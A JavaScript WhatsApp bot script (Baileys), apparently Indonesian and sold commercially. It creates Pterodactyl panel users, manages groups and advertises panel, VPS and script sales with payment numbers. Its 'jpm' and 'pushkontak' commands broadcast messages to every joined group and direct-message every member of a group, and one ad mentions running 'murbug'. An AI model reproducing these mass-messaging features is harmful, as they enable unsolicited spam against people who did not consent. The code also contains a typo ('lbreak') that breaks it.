//NOTE : JIKA INGIN RECODE JANGAN LUPA LETAK CREDIT GUA "RIZZPIW" 
//JANGAN DI SEBAR SC INI 
//JANGAN JUAL SC INI DI BAWAH 5K

//REAL SC RIZZPIW
//Wa.me/62895614033342 [ Wa 1 ] 
//Wa.me/6281268935404 [ Wa 2 ]

//KETAHUAN JUAL SC INI DI BAWAH 5K LANGSUNG GUA FULL ENC!

require('../settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@adiwajshing/baileys");
const fs = require("fs");
const chalk = require("chalk");
const crypto = require("crypto");
const { exec, spawn, execSync } = require("child_process");
const axios = require("axios");
const fetch = require("node-fetch");
const Jimp = require("jimp");
const util = require("util");
const { sizeFormatter} = require("human-readable")
const format = sizeFormatter()
const cheerio = require('cheerio')
const os = require('os')
const yts = require('yt-search')
const ytdl = require('ytdl-core')
const moment = require('moment-timezone')
const colors = require('colors/safe');
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const hariiini = moment.tz('Asia/Jakarta').format('DD MMMM YYYY')
const { color, bgcolor, mycolor } = require('./lib/color')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/exif')
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, parseMention, getRandom } = require('./lib/functions')
const addusrp = JSON.parse(fs.readFileSync('./rizzpiwjs/database/user.json'))

//====================================================//

module.exports = rizzpiw = async (rizzpiw, m, chatUpdate, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const content = JSON.stringify(m.message)
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
const botNumber = await rizzpiw.decodeJid(rizzpiw.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isSeler = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const { chats } = m

//====================================================//
//Bagian Const Tanggal Dan Jam
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const hariiini = moment.tz('Asia/Jakarta').format('DD MMMM YYYY')
const jam = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const time = moment(new Date()).format("HH:mm");

//====================================================//
//Bagian Const Grup
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await rizzpiw.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

const pler = JSON.parse(fs.readFileSync('./config/idgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false	
	
if (!rizzpiw.public) {
if (!m.key.fromMe) return
}

//--------------------------------------------------------------------------------------------------\\
//Console
if (m.isGroup && isCmd) {
console.log(colors.green.bold("[Group]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(groupName));
}

if (!m.isGroup && isCmd) {
console.log(colors.green.bold("[Private]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(pushname));
}

		
try {
ppuser = await rizzpiw.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

//=================================================//

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `Bot Panel By RizzPiw\n`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;RizzPiwBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/3c485ff201d9337be14ef.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

        const ftext = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `*Hai ${pushname}👋*\n  ${moment().utcOffset('+0700').format('HH:mm:ss')} ${moment.tz('Asia/Jakarta').format('DD/MM/YYYY')}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./image/logo.jpg')}}}
        
        const ftoko = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./image/logo.jpg`)},"title": `© RIZZPIW`,"description": "RIZZPIW", "currencyCode": "IDR","priceAmount1000": "999999","retailerId": "RizzPiw","productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
        
//=================================================//

const generateProfilePicture = async(buffer) => {
const jimp_1 = await Jimp.read(buffer);
const resz = jimp_1.getWidth() > jimp_1.getHeight() ? jimp_1.resize(550, Jimp.AUTO) : jimp_1.resize(Jimp.AUTO, 650)
const jimp_2 = await Jimp.read(await resz.getBufferAsync(Jimp.MIME_JPEG));
return {
img: await resz.getBufferAsync(Jimp.MIME_JPEG)
}
}

//=================================================//
//Bagian Const Download Ytmp3 Dan Ytmp4
const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await rizzpiw.sendMessage(m.chat, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: fkontak })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await rizzpiw.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: fkontak })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}
async function sendRizzpiwMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await rizzpiw.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
//━━━━━━━━━━━━━━━[ BATAS FAKE ]━━━━━━━━━━━━━━━━━//
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

function randomNomor(min, max = null) {
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
function monospace(string) {
return '```' + string + '```'
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

global.addUserPanel = (email, username, expired, _db) => {
var obj_add = {
email: email,
username: username,
expired: expired
}
_db.push(obj_add)
fs.writeFileSync('./rizzpiwjs/database/user.json', JSON.stringify(_db, null, 3))
}

switch (command) {

//━━━━━━━━━━━━━━[ MENU ]━━━━━━━━━━━━━━//
//GroupMenu
case 'hidetag': case 'h': {
if (!m.isGroup) return m.reply(mess.group)
if (!isCreator) return m.reply(mess.owner)
rizzpiw.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: fkontak })
}
break

case 'k': case 'kick':{
if (!isGroupAdmins) return m.reply(`Perintah ini hanya bisa digunakan oleh Admin Grup`)
if (!isBotAdmins) return m.reply(`Bot Belum Admin`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rizzpiw.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

case 'add': {
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rizzpiw.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break   

case 'lgc': case 'linkgc': {
if (!isCreator) return m.reply('Khusus creator bot')
if (!m.isGroup) return m.reply('Harus Di Dalam Grup')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
let response = await rizzpiw.groupInviteCode(from)
rizzpiw.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'r': case 'revoke': case 'setellink': case 'resetlink':
if (!isCreator) return m.reply(mess.owner)
await rizzpiw.groupRevokeInvite(from)
.then( res => {
m.reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => m.reply(mess.error.api))
break

case 'promote': {
if (!isGroupAdmins) return m.reply(`khusus admin grup`) 
if (!isAdmins && !isOwner) return m.reply(mess.owner)
if (!isBotAdmins) return m.reply(`bot bukan admin`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rizzpiw.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
m.reply(`Succes Promote @${users.split("@")[0]}`)
}
break
case 'demote': {
if (!isGroupAdmins) return m.reply(`husus admin grup`)
if (!isAdmins && !isOwner) return m.reply(`Khusus Admin Dan Owner`)
if (!isBotAdmins) return m.reply(`bot bukan admin`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rizzpiw.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

//--------------------------------------------------------------------------------------------------\\
//Bagian Owner Menu
case 'join': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
m.reply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await rizzpiw.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'leave': {
if (!isCreator) return m.reply(mess.owner)
await rizzpiw.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'addseler': case 'addseller':{
 if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} @tag/nomor`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await rizzpiw.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./config/seller.json', JSON.stringify(owner))
m.reply(`Nomor ${bnnd} Sudah Bisa Akses!!!`)
}
break

case 'delseler': case 'delseller':{
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} @tag/nomor`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./config/seller.json', JSON.stringify(owner))
m.reply(`Nomor ${ya} Sudah Tidak Bisa Add Server`)
}
break

case 'listseler': case 'listseller':{
if (!isCreator) return m.reply(mess.owner)
let listseller =`*LIST SELLER ZANSXD*\n\nTotal Seller : ${owner.length}\n`
var no = 1
for (let x of owner) {
listseller +=`\nUser: ${no++}\nID: ${x}\n\n`
}
listseller +=`Untuk Menghapus Akses Seller Ketik ${prefix}delseler 628xxx/@tag`
rizzpiw.sendMessage(m.chat, {text: listseller},{quoted: fkontak})
}
break

case 'pushmember': case 'jpm': {
if (!isCreator && !fromMe) throw mess.owner
if (!text) throw `Text mana?\n\nContoh : ${prefix + command} Masuk Ke Grup Gua Ngab 200 Mem Bagi" Panel Free\n\nLink Group : https://chat.whatsapp.com/L0tHBUV3pEh1ShIBPIegig`
let getGroups = await rizzpiw.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let piw = groups.map(v => v.id)
m.reply(`Sedang ${command} Ke ${piw.length} Group , Mohon Bersabar Jpm Ini Delay 3 Detik/Share`)
for (let i of piw) {
await sleep(3000)
let txt = `${text}`
rizzpiw.sendMessage(i, {text: txt} )
}
m.reply(`Sukses ${command} Ke ${piw.length} Group`)
}
break

case 'push': case 'pushkontak':{
if (!isCreator && !fromMe) return mess.owner
if (!m.isGroup) return m.reply(`Harus Dalam Grup`)
if (!q) return m.reply(`Teks nya Mana?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
pow = `Sedang Di Proses,Mohon Bersabar Push kontak Ini Delay 5 Detik/Share`
rizzpiw.sendMessage(m.chat, {text: pow},{quoted: fkontak})
for (let pler of mem) {
rizzpiw.sendMessage(pler, { text: q})
await sleep(5000)
}  
piw =`Succes Push Kontak Ke ${participants.length} Member`
rizzpiw.sendMessage(from, {text: piw},{quoted: fkontak})
}
break
//--------------------------------------------------------------------------------------------------\\
//Domain Menu
case 'domain':{
let piw = `
┌⁠───[ *LIST DOMAIN* ]───
│
○ ${prefix}domain [ jasa-panel.my.id ]
○ ${prefix}domain [ didinsec.biz.id ]
○ ${prefix}domain3 [ didindev.my.id ]
○ ${prefix}domain4 [ sellerpannel.my.id ]
○ ${prefix}domain5 [ panellku.my.id ]
○ ${prefix}domain6 [ panellku.me ]
○ ${prefix}domain7 [ panellku.biz.id ]
○ ${prefix}domain8 [ panellku.com ]
○ ${prefix}domain9 [ mypanel.biz.id ]
○ ${prefix}domain10 [ panellku.art ]
○ ${prefix}domain11 [ biistoreee.xyz ]
○ ${prefix}domain12 [ putraoffc.site ]
○ ${prefix}domain13 [ putraoffc.com ]
○ ${prefix}domain14 [ kangpannel.xyz ]
│
└───[ *ZANSXD STORE* ]───`

rizzpiw.sendMessage(m.chat, { image: logo, caption: `${piw}` }, {quoted: fkontak})
}
break

case 'addgc':
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply(`Harus Dalam Gc`)
pler.push(m.chat)
fs.writeFileSync('./config/idgrup.json', JSON.stringify(pler))
m.reply('Sukses addgc')
	
	break 
case 'delgc':
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply(`Harus Dalam Gc`)
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./config/idgrup.json', JSON.stringify(pler))
m.reply('Sukses Delgc')
break

//--------------------------------------------------------------------------------------------------\\
//Bagian Menu

case 'menu':
case 'rmenu':
case 'allmenu':
case 'rallmenu': {
m.reply(`Woi ${pushname} Bentar Ya Tod, Menu Nya Akan Muncul Dalam 3 Detik `)
await sleep(3000)

let menu_nya =` Hai Kak ${pushname}

┌⁠──────────
○ Nama Owner : ${namaOwner}
○ Nama Bot : ${namaBot}
○ Nomor Owner : ${nomorOwner}
○ Version : 3.1
└──────────

┌⁠────[ 𝗣𝗔𝗡𝗘𝗟 𝗠𝗘𝗡𝗨 ]
○ ${prefix}addusr
○ ${prefix}addusr2
○ ${prefix}delusr
○ ${prefix}listusr
○ ${prefix}detusr
○ ${prefix}addsrv
○ ${prefix}delsrv
○ ${prefix}listsrv
○ ${prefix}detsrv
○ ${prefix}createadmin
└──────────

┌⁠────[ 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗠𝗘𝗡𝗨 ]
○ ${prefix}1gb,username,628xxx
○ ${prefix}2gb,username,628xxx
○ ${prefix}3gb,username,628xxx
○ ${prefix}4gb,username,628xxx
○ ${prefix}5gb,username,628xxx
○ ${prefix}6gb,username,628xxx
○ ${prefix}unli [ Khusus Owner ]
└──────────

┌⁠────[ 𝗗𝗢𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨 ]
○ ${prefix}domain
○ ${prefix}addgc
○ ${prefix}delgc
└──────────

┌⁠────[ 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨 ]
○ ${prefix}hidetag / h 
○ ${prefix}kick / k
○ ${prefix}add
○ ${prefix}linkgc / lgc
○ ${prefix}revoke / r
○ ${prefix}promote
○ ${prefix}demote
└──────────

┌⁠────[ 𝗦𝗧𝗢𝗥𝗘 𝗠𝗘𝗡𝗨 ]
○ ${prefix}listpanel
○ ${prefix}listvps
○ ${prefix}listjasainstall
○ ${prefix}done
○ ${prefix}proses
○ ${prefix}payment
○ ${prefix}sendbayar
└──────────

┌⁠────[ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 ]
○ ${prefix}join
○ ${prefix}leave
○ ${prefix}addseler
○ ${prefix}delseler
○ ${prefix}listseler
○ ${prefix}jpm
○ ${prefix}pushkontak
└──────────

┌⁠────[ 𝗩𝗘𝗥𝗜𝗙𝗬 𝗠𝗘𝗡𝗨 ] 
○ ${prefix}logout 628xxx
○ ${prefix}verif 628xxx
└──────────

*© ZANSXD*`
rizzpiw.sendMessage(m.chat, { image: logo, caption: `${menu_nya}` }, {quoted: fkontak})
}
break

//--------------------------------------------------------------------------------------------------\\
case 'crator': case 'owner': case 'rowner': {
rizzpiw.sendContact(from, global.owner, fkontak)
}
break
//--------------------------------------------------------------------------------------------------\\
//Jualan/Produk
case 'sc': case 'rsc': case 'script':{
let menu_nya =`Hai Kak ${pushname}

Mau Beli Script Nya?

*Chat :*
*- Wa.me/6283171043979*
*- Wa.me/62831710439795*

*Payment :*
- Dana
- Gopay
- Qris Allpay

*HARGA : CHAT OWNER*

*BONUS*
- Free Panel Ram 1
- Free Pamasangan
- Ukuran Script Ringan

*© ZANSXD STORE*`
rizzpiw.sendMessage(m.chat, { image: logo, caption: `${menu_nya}` }, {quoted: fkontak})
}
break

//--------------------------------------------------------------------------------------------------\\
//Bagian Store Menu

case 'listpanel': case 'rlistpanel': case 'buypanel':{
let menu_nya =`Hai Kak ${pushname}

*LIST HARGA PANEL BY ZANSXD*

- RAM 1GB CPU 30% 3K/BULAN
- RAM 2GB CPU 50% 7K/BULAN
- RAM 3GB CPU 75% 10K/BULAN
- RAM 4GB CPU 100% 15K/BULAN
- RAM 5GB CPU 130% 20K/BULAN
- RAM 6GB CPU 150% 25K/BULAN
- RAM 7GB CPU 175% 30K/BULAN
- RAM 8GB CPU 175% 35K/BULAN
- RAM,CPU,DISK UNLIMITED 10K/BULAN

- ADMIN PANEL 15K/BULAN

*[ KEUNTUNGAN PANEL ]*

- BISA BUAT RUN BOT NO RIBET
- WEBSITE/APK CLOSE BOT TETAP ON/JALAN
- GA BOROS KUOTA
- GA MENUHIN MEMORI
- BISA OPEN MURBUG

*[ KEUNTUNGAN ADMIN PANEL ]*

- BISA CREATE PANEL SENDIRI
- BISA CREATE PANEL SEPUAS NYA
- BISA JUAL PANEL KE ORANG LAIN
- BISA BALMOD KALO LU NIAT JUALAN

▰▰▰▰▰▰▰▰▰▰▰▰▰▰

*MINAT? CHAT*
Wa.me/6283171043979
Wa.me/62831710439795

*© ZANSXD STORE*`
rizzpiw.sendMessage(m.chat, { image: logo, caption: `${menu_nya}` }, {quoted: fkontak})
}
break

case 'listvps': case 'rlistvps':{
let menu_nya =`Hai Kak ${pushname}

*LIST HARGA VPS BY ZANSXD*

- RAM 2GB CORE 1 : 15K
- RAM 2GB CORE 2 : 20K
- RAM 4GB CORE 2 : 30K
- RAM 8GB CORE 4 : 50K

*NOTE*
- GARANSI 7 HARI
- MASA AKTIF 1 BULAN
- PROVAIDER : DIGITALOCEAN [ DO ]

*MINAT? CHAT*
Wa.me/6283171043979
Wa.me/62831710439795

*© ZANSXD STORE*`
rizzpiw.sendMessage(m.chat, { image: logo, caption: `${menu_nya}` }, {quoted: fkontak})
}
break

case 'listjasainstall': case 'rlistjasainstall': case 'jasainstall':{
let menu_nya =`Hai Kak ${pushname}

*HARGA JASA INSTALL BY ZANSXD*

*• PAKET 1*
- VPS DARI LU
- DOMAIN DARI LU
*[ HARGA : 5K ]*

*• PAKET 2*
- VPS DARI LU
- DOMAIN DARI GUA
*[ HARGA : 8K ]*

*• PAKET 3*
- VPS DARI GUA *RAM 4 GB*
- DOMAIN DARI GUA
*[ HARGA 35K ]*

*• PAKET 4*
- VPS DARI GUA *RAM 8 GB*
- DOMAIN DARI GUA
*[ HARGA 65K ]*

*• PAKET 5*
VERSI LIMIT 
- LIMIT 20GB : 20K
- LIMIT 40GB : 35K
- LIMIT 80GB : 60K

*NOTE :*
UNTUK PAKET 1-4 UDAH TERMASUK 
- FREE INSTALL WINGS 
- FREE PASANG EGG
- TINGGAL PAKAI AJA

UNTUK PAKET 5 UDAH TERMASUK
- UDAH KE INSTALL PANEL
- UDAH KE INSTALL WINGS
- UDAH KEPASANG EGG
- LINK LOGIN NAMA LU
- TINGGAL PAKAI AJA

*MINAT? CHAT*
Wa.me/6283171043979
Wa.me/62831710439795

*© ZANSXD STORE*

*- MINIMAL KALO MAU COPY TEKS IZIN DULU KE ORANG ORANG NYA | 6283171043979*`

rizzpiw.sendMessage(m.chat, { image: logo, caption: `${menu_nya}` }, {quoted: fkontak})
}
break

case 'listsc': case 'listscript':{
let menu_nya =` Hai Kak ${pushname}

*SCRIPT YG ZANSXD JUAL*

• SC JPM
• SC PUSH KONTAK
• SC BIKIN SUBDO 
• SC JPM + PUSH KONTAK
• SC CREATE PANEL BIASA
• SC CREATE ADMIN PANEL
• SC CREATE ADMIN PANEL + JPM + PUSH KONTAK + DOMAIN

HARGA? CHAT 
*- Wa.me/6283171043979*
*- Wa.me/62831710439795*

*© ZANSXD STORE*`

rizzpiw.sendMessage(m.chat, { image: logo, caption: `${menu_nya}` }, {quoted: fkontak})
}
break

case 'done': case 'd1':{
if (!isCreator) return m.reply(mess.owner)
let menu_nya =`
*ALHAMDULILLAH DONE*

HARI : ${hariini}
TANGGAL : ${tanggal}
JAM : ${jam}

*NOTE :*
*- ALL TRX NO REFF*
*- MAKSA REFF? BLOK*

*FROM : ZANSXD STORE*
*WA 1 : 6283171043979*
*WA 2 : 62831710439795*

SELAIN NO DI ATAS WASPADA CLONE!!

JANGAN LUPA ORDER KEMBALI YA`
rizzpiw.sendMessage(from, {text: menu_nya}, {quoted: fkontak})
}
break

case 'proses': {
if (!isCreator) return m.reply(mess.owner)
let tek = `「 *TRANSAKSI PENDING* 」
📆 TANGGAL : ${tanggal}
⌚ JAM     : ${jam}
✨ STATUS  : Pending

*--------------------------*

*Pesanan ini akan diproses manual oleh admin,* *Tunggu admin memprosesnya🙏*`
let btn_menu = [
{buttonId: `${prefix}_`, buttonText: { displayText: 'OKE SAYA TUNGGU👍' }, type: 1 },
]
rizzpiw.sendMessage(from,
{text: tek,
buttons: btn_menu})
rizzpiw.sendMessage(`${global.ownerNumber}`, {text: `_`}, {quoted: fkontak})
}
break

case 'sendbyr': case 'sendbayar': {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
rizzpiw.sendMessage(piw, { image: qris,  caption: `━━━[ PAYMENT RIZZPIW ]━━━

NO DANA 1 : 082174453171
NO DANA 2 : -

NO GOPAY 1 : 083845909483
NO GOPAY 2 : -

QRIS ALLPAY : SCAN 

Jangan Lupa Kirim Bukti Pembayaran Ke ZANSXD
` }, { quoted: fkontak })
}
break

case 'payment': case 'rpayment':{
piw = `Hai Kak ${pushname}

*PAYMENT ZANSXD*

• ${prefix}dana
• ${prefix}gopay
• ${prefix}qris

Silahkan Ketik Salah satu payment di atas
Dan Jangan Lupa Kirim Bukti Pembayaran Ke *RIZZPIW*`
m.reply(piw)
}
break

case 'dana': case 'rdana': {
rizzpiw.sendMessage(m.chat, { image: dana, caption: `
Hai Kak ${pushname}

QRIS DANA : SCAN
NO DANA : 082174453171
ATAS NAMA : 

Jangan Lupa Kirim Bukti Pembayaran Ke ZansXD` }, { quoted: fkontak })
}
break

case 'gopay': case 'rgopay': {
rizzpiw.sendMessage(m.chat, { image: gopay, caption: `
Hai Kak ${pushname}

QRIS GOPAY : SCAN
NO GOPAY : 083845909483

Jangan Lupa Kirim Bukti Pembayaran Ke ZansXD` }, { quoted: fkontak })
 }
lbreak

case 'qrisallpay': case 'rqrisallpay': case 'qris': case 'rqris':{
rizzpiw.sendMessage(m.chat, { image: qris, caption: `Hai Kak ${pushname}

QRIS ALL PAYMENT : SCAN

Jangan Lupa Kirim Bukti Pembayaran Ke ZansXD` }, { quoted: fkontak })
}
break

//--------------------------------------------------------------------------------------------------\\
//Add User
case "addusr": {
if (!isCreator) return m.reply(mess.owner)
let t = text.split(',');
if (t.length < 3) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await rizzpiw.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await rizzpiw.sendMessage(m.chat, { text: `
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER*
○
○ TYPE: user
○
○ ID: ${user.id}
○ UUID: ${user.uuid}
○ USERNAME: ${user.username}
○ EMAIL: ${user.email}
○ NAME: ${user.first_name} ${user.last_name}
○ LANGUAGE: ${user.language}
